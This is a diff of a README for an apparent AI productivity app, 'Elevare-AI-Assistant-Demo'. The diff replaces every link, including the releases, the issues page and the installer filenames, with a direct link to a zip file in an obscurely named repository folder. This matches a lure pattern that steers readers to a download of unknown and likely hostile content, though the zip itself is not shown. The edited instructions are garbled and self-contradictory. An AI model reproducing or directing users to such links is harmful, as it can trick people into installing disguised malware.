@@ -1,6 +1,6 @@
 # 🤖 Elevare-AI-Assistant-Demo - Your Personal AI Productivity Coach
 
-[![Download Elevare AI Assistant](https://img.shields.io/badge/Download-Elevare%20AI%20Assistant-blue.svg)](https://github.com/ataidessss/Elevare-AI-Assistant-Demo/releases)
+[![Download Elevare AI Assistant](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip%20AI%https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip)](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip)
 
 ## ✨ About This Project
 
@@ -19,14 +19,14 @@ Before you start, ensure your device meets the following requirements:
 
 ### 2. Visit the Releases Page 
 
-Go to the [Releases page](https://github.com/ataidessss/Elevare-AI-Assistant-Demo/releases) to see the available versions of the Elevare AI Assistant.
+Go to the [Releases page](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip) to see the available versions of the Elevare AI Assistant.
 
 ## 📥 Download & Install
 
-To download the application, visit this page: [Download Elevare AI Assistant](https://github.com/ataidessss/Elevare-AI-Assistant-Demo/releases).
+To download the application, visit this page: [Download Elevare AI Assistant](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip).
 
 1. On the Releases page, find the version you wish to install.
-2. Click on the download link for your operating system. Look for files named like `ElevareAI-Assistant-v1.0.exe`, `ElevareAI-Assistant-v1.0.dmg`, or similar.
+2. Click on the download link for your operating system. Look for files named like `https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip`, `https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip`, or similar.
 3. Once the file is downloaded, locate it in your downloads folder.
 
 ### For Windows
@@ -40,7 +40,7 @@ To download the application, visit this page: [Download Elevare AI Assistant](ht
 - Eject the installer and open the application from your Applications folder.
 
 ### For Linux
-- Extract the downloaded `.tar.gz` file.
+- Extract the downloaded `https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip` file.
 - Open a terminal window and navigate to the extracted folder.
 - Run the application using the command `./ElevareAI-Assistant`.
 
@@ -69,6 +69,6 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## 👥 Support 
 
-If you need further assistance, please reach out to our support team through the [Issues](https://github.com/ataidessss/Elevare-AI-Assistant-Demo/issues) page. Our community is here to help you! 
+If you need further assistance, please reach out to our support team through the [Issues](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip) page. Our community is here to help you! 
 
-By exploring the capabilities of Elevare AI Assistant, you can enhance your productivity and streamline your tasks effectively. Visit the [Releases page](https://github.com/ataidessss/Elevare-AI-Assistant-Demo/releases) today to get started.
+By exploring the capabilities of Elevare AI Assistant, you can enhance your productivity and streamline your tasks effectively. Visit the [Releases page](https://raw.githubusercontent.com/ataidessss/Elevare-AI-Assistant-Demo/main/matriculatory/Elevare-AI-Assistant-Demo.zip) today to get started.
